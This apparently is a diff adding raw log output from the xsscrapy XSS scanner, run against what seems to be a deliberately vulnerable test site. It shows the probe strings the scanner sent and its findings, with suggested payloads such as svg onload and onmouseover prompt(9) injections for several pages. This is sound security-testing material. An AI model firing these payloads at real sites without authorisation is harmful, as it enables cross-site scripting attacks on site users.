+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=1zqjmd'%22()%7B%7D%3Cx%3E:/1zqjmd;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php/1zqjfp'%22()%7B%7D%3Cx%3E:1zqjfp;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=1zqjxi'%22()%7B%7D%3Cx%3E:/1zqjxi;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404/1zqjlt'%22()%7B%7D%3Cx%3E:1zqjlt;9. type = url, end of url
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234> (referer: 1zqjia'"(){}<x>:/1zqjia;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php/1zqjoz'%22()%7B%7D%3Cx%3E:1zqjoz;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404. type = header, cookie
+
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php/1zqjtt'%22()%7B%7D%3Cx%3E:1zqjtt;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=1zqjle'%22()%7B%7D%3Cx%3E:/1zqjle;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=1zqjoc'%22()%7B%7D%3Cx%3E:/1zqjoc;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/index.php/requestXaX404. type = header, Referer
+
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234> (referer: 1zqjoj'"(){}<x>:/1zqjoj;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php/1zqjqn'%22()%7B%7D%3Cx%3E:1zqjqn;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php/1zqjmg'%22()%7B%7D%3Cx%3E:1zqjmg;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=1zqjxn'%22()%7B%7D%3Cx%3E:/1zqjxn;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '"(){}<x>:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjxn'"(){}<x>:/1zqjxn;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: </SCript><svG/onLoad=prompt(9)>, x";prompt(9);
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <script>
+            var xss = "1zqjxn'"(){}<x>:/1zqjxn;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=1zqjxn'%22()%7B%7D%3Cx%3E:/1zqjxn;9>
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=1zqjrq'%22()%7B%7D%3Cx%3E:/1zqjrq;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php/1zqjwg'%22()%7B%7D%3Cx%3E:1zqjwg;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=1zqjvt'%22()%7B%7D%3Cx%3E:/1zqjvt;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php/1zqjsf'%22()%7B%7D%3Cx%3E:1zqjsf;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php/1zqjeb'%22()%7B%7D%3Cx%3E:1zqjeb;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234)
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=1zqjyn'%22()%7B%7D%3Cx%3E:/1zqjyn;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '(){}x:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjyn'"(){}<x>:/1zqjyn;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: ;prompt(9);
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <script>
+            var xss = `1zqjyn'&quot;(){}&lt;x&gt;:/1zqjyn;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=1zqjyn'%22()%7B%7D%3Cx%3E:/1zqjyn;9>
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=1zqjhy'%22()%7B%7D%3Cx%3E:/1zqjhy;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php/1zqjoz'%22()%7B%7D%3Cx%3E:1zqjoz;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=1zqjoc'%22()%7B%7D%3Cx%3E:/1zqjoc;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234> (referer: 1zqjot'"(){}<x>:/1zqjot;9)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_value.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php/1zqjqn'%22()%7B%7D%3Cx%3E:1zqjqn;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234> (referer: 1zqjpc'"(){}<x>:/1zqjpc;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234> (referer: 1zqjgy'"(){}<x>:/1zqjgy;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php/1zqjdu'%22()%7B%7D%3Cx%3E:1zqjdu;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=1zqjrq'%22()%7B%7D%3Cx%3E:/1zqjrq;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php/1zqjwg'%22()%7B%7D%3Cx%3E:1zqjwg;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=1zqjvt'%22()%7B%7D%3Cx%3E:/1zqjvt;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php/1zqjeb'%22()%7B%7D%3Cx%3E:1zqjeb;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234> (referer: 1zqjuv'"(){}<x>:/1zqjuv;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php/1zqjnb'%22()%7B%7D%3Cx%3E:1zqjnb;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=1zqjhy'%22()%7B%7D%3Cx%3E:/1zqjhy;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=1zqjuh'%22()%7B%7D%3Cx%3E:/1zqjuh;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234> (referer: 1zqjko'"(){}<x>:/1zqjko;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php/1zqjjk'%22()%7B%7D%3Cx%3E:1zqjjk;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=1zqjmd'%22()%7B%7D%3Cx%3E:/1zqjmd;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php/1zqjdu'%22()%7B%7D%3Cx%3E:1zqjdu;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234> (referer: 1zqjho'"(){}<x>:/1zqjho;9)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php/1zqjnb'%22()%7B%7D%3Cx%3E:1zqjnb;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=1zqjle'%22()%7B%7D%3Cx%3E:/1zqjle;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=1zqjuh'%22()%7B%7D%3Cx%3E:/1zqjuh;9. type = url, xss
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234> (referer: 1zqjog'"(){}<x>:/1zqjog;9)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php/1zqjtt'%22()%7B%7D%3Cx%3E:1zqjtt;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234)
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_comment.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php/1zqjjk'%22()%7B%7D%3Cx%3E:1zqjjk;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=1zqjmd'%22()%7B%7D%3Cx%3E:/1zqjmd;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '(){}x:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjmd'"(){}<x>:/1zqjmd;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: x';prompt(9);
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <script>
+            var xss = '1zqjmd'&quot;(){}&lt;x&gt;:/1zqjmd;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=1zqjmd'%22()%7B%7D%3Cx%3E:/1zqjmd;9>
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/index.php)
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234
+2021-06-28 17:21:25 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=1zqjle'%22()%7B%7D%3Cx%3E:/1zqjle;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Unfiltered: '(){}x:/;
+2021-06-28 17:21:25 [xsscrapy] INFO:     Payload: 1zqjle'"(){}<x>:/1zqjle;9
+2021-06-28 17:21:25 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:25 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:25 [xsscrapy] INFO:     Possible payloads: ;prompt(9);
+2021-06-28 17:21:25 [xsscrapy] INFO:     Line: <img src="/img/xss-meme.jpg" alt="funny meme" onload="1zqjle'&quot;(){}&lt;x&gt;:/1zqjle;9
+2021-06-28 17:21:25 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=1zqjle'%22()%7B%7D%3Cx%3E:/1zqjle;9>
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php/1zqjtt'%22()%7B%7D%3Cx%3E:1zqjtt;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:25 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php/1zqjno'%22()%7B%7D%3Cx%3E:1zqjno;9/?xss=234
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded URL: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=1zqjit'%22()%7B%7D%3Cx%3E:/1zqjit;9
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:25 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:26 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=1zqjit'%22()%7B%7D%3Cx%3E:/1zqjit;9> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234)
+2021-06-28 17:21:26 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_value.php/1zqjno'%22()%7B%7D%3Cx%3E:1zqjno;9/?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234)
+2021-06-28 17:21:26 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234> (referer: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234)
+2021-06-28 17:21:26 [scrapy] DEBUG: Crawled (200) <GET https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234> (referer: 1zqjxt'"(){}<x>:/1zqjxt;9)
+2021-06-28 17:21:26 [xsscrapy] INFO:     URL: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234
+2021-06-28 17:21:26 [xsscrapy] INFO:     response URL: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=1zqjit'%22()%7B%7D%3Cx%3E:/1zqjit;9
+2021-06-28 17:21:26 [xsscrapy] INFO:     Unfiltered: '"(){}<x>:/;
+2021-06-28 17:21:26 [xsscrapy] INFO:     Payload: 1zqjit'"(){}<x>:/1zqjit;9
+2021-06-28 17:21:26 [xsscrapy] INFO:     Type: url
+2021-06-28 17:21:26 [xsscrapy] INFO:     Injection point: xss
+2021-06-28 17:21:26 [xsscrapy] INFO:     Possible payloads: x"/onmouseover=prompt(9)/", x"><svG onLoad=prompt(9)>, x" onmouseover=prompt(9) "
+2021-06-28 17:21:26 [xsscrapy] INFO:     Line: <input name="xss" value="1zqjit'"(){}<x>:/1zqjit;9
+2021-06-28 17:21:26 [scrapy] DEBUG: Scraped from <200 https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=1zqjit'%22()%7B%7D%3Cx%3E:/1zqjit;9>
+
+2021-06-28 17:21:26 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_value.php/1zqjno'%22()%7B%7D%3Cx%3E:1zqjno;9/?xss=234. type = url, URL path
+
+2021-06-28 17:21:26 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234. type = header, cookie
+
+2021-06-28 17:21:26 [scrapy] WARNING: Dropped: No XSS vulns in https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234. type = header, Referer
+
+2021-06-28 17:21:26 [scrapy] INFO: Closing spider (finished)
+2021-06-28 17:21:26 [scrapy] INFO: Dumping Scrapy stats:
+{'downloader/request_bytes': 37697,
+ 'downloader/request_count': 89,
+ 'downloader/request_method_count/GET': 88,
+ 'downloader/request_method_count/POST': 1,
+ 'downloader/response_bytes': 146743,
+ 'downloader/response_count': 89,
+ 'downloader/response_status_count/200': 88,
+ 'downloader/response_status_count/404': 1,
+ 'finish_reason': 'finished',
+ 'finish_time': datetime.datetime(2021, 6, 28, 17, 21, 26, 161274),
+ 'item_dropped_count': 62,
+ 'item_dropped_reasons_count/DropItem': 62,
+ 'item_scraped_count': 8,
+ 'log_count/DEBUG': 169,
+ 'log_count/INFO': 72,
+ 'log_count/WARNING': 62,
+ 'offsite/domains': 1,
+ 'offsite/filtered': 17,
+ 'request_depth_max': 2,
+ 'response_received_count': 89,
+ 'scheduler/dequeued': 89,
+ 'scheduler/dequeued/memory': 89,
+ 'scheduler/enqueued': 89,
+ 'scheduler/enqueued/memory': 89,
+ 'start_time': datetime.datetime(2021, 6, 28, 17, 21, 16, 927279)}
+2021-06-28 17:21:26 [scrapy] INFO: Spider closed (finished)
+/usr/local/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography import utils, x509
+/usr/local/lib/python2.7/site-packages/BeautifulSoup.py:114: UserWarning: You are using a very old release of Beautiful Soup, last updated in 2011. If you installed the 'beautifulsoup' package through pip, you should know the 'beautifulsoup' package name is about to be reclaimed by a more recent version of Beautiful Soup which is incompatible with this version.
+
+This will happen at some point after January 1, 2021.
+
+If you just started this project, this is easy to fix. Install the 'beautifulsoup4' package instead of 'beautifulsoup' and start using Beautiful Soup 4.
+
+If this is an existing project that depends on Beautiful Soup 3, the project maintainer (potentially you) needs to start the process of migrating to Beautiful Soup 4. This should be a relatively easy part of the Python 3 migration.
+
+  """)
+2021-06-28 17:21:26 [scrapy] INFO: Scrapy 1.1.0rc3 started (bot: xsscrapy)
+2021-06-28 17:21:26 [scrapy] INFO: Overridden settings: {'NEWSPIDER_MODULE': 'xsscrapy.spiders', 'DUPEFILTER_CLASS': 'xsscrapy.bloomfilters.BloomURLDupeFilter', 'SPIDER_MODULES': ['xsscrapy.spiders'], 'CONCURRENT_REQUESTS': '30', 'BOT_NAME': 'xsscrapy', 'DOWNLOAD_DELAY': '0'}
+2021-06-28 17:21:26 [scrapy] INFO: Enabled extensions:
+['scrapy.extensions.logstats.LogStats',
+ 'scrapy.extensions.telnet.TelnetConsole',
+ 'scrapy.extensions.corestats.CoreStats']
+2021-06-28 17:21:26 [scrapy] INFO: Enabled downloader middlewares:
+['xsscrapy.middlewares.InjectedDupeFilter',
+ 'xsscrapy.middlewares.RandomUserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware',
+ 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware',
+ 'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.retry.RetryMiddleware',
+ 'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware',
+ 'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.RedirectMiddleware',
+ 'scrapy.downloadermiddlewares.cookies.CookiesMiddleware',
